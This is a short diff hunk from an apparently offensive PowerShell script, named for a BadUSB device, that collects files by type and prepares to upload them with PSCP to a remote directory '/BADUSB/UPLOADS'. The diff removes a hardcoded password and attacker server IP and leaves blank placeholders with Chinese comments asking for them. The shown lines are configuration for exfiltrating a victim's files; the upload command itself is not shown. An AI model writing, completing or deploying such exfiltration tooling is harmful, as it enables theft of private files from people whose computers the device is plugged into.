@@ -6,8 +6,8 @@ $files = foreach ($fileType in $fileTypes) {
 
 # 设置用户名、密码和远程路径
 $username = "BADUSB"
-$password = "LJJYYDS"
-$remoteHost = "118.178.229.36"
+$password = "" # 远程仓库username的密码
+$remoteHost = ""  # 远程仓库ip地址
 $remoteDir = "/BADUSB/UPLOADS"
 $scpPath = "D:\HACKER\PSCP.EXE"
 
